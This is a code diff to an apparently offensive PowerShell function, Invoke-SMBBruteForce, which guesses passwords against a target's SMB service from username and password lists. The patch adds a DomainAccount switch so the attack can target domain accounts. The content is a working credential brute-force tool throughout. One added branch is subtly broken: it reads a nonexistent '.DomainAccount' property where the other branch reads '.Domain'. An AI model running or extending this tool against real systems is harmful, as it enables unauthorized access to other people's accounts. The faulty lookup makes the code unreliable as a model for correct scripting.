@@ -47,6 +47,11 @@ function Invoke-SMBBruteForce
     A file on the local host which contains a list of passwords. This can either be in txt line separated, or CSV comma
     separated. 
 
+.Parameter DomainAccount
+
+    This is a switch which denotes that the user accounts in the Password or PasswordFile parameter are domain accounts. The script will automatically
+    fetch the domain name. 
+
 #>
 
 
@@ -67,7 +72,10 @@ function Invoke-SMBBruteForce
     [String] $Password,
 
     [Parameter(ParameterSetName = "Files", mandatory=$false)]
-    [String] $PasswordFile
+    [String] $PasswordFile, 
+
+    [Parameter(ParameterSetName = "Files", Mandatory=$false)]
+    [Switch] $DomainAccount
     )
 
     Process
@@ -82,7 +90,14 @@ function Invoke-SMBBruteForce
                 Write-Host "[*]Loaded $UserFileLength from $UsernameFile"
                 foreach($user in get-content $UsernameFile)
                 {
-                $u = "$target\$user"
+                if(!$DomainAccount) 
+                {
+                    $u = "$target\$user"
+                }
+                else {
+                    $domain = (Get-WMiObject Win32_ComputerSystem).DomainAccount
+                    $u = "$domain\$user"
+                }
                     if(!$PasswordFile)
                     {
                         try 
@@ -131,7 +146,14 @@ function Invoke-SMBBruteForce
             }
             else
             {
-                $u = "$Target\$Username"
+                if(!$DomainAccount){
+                     $u = "$Target\$Username"
+                }
+                else {
+                    $domain = (Get-WMiObject Win32_ComputerSystem).Domain
+                    $u = "$domain\$Username"
+                }
+                
                 Write-Host "[*]Attempting to brute force $target with the username $u "
                 Write-Host "[*] Starting Brute Force Operation"
                 if(!$PasswordFile)
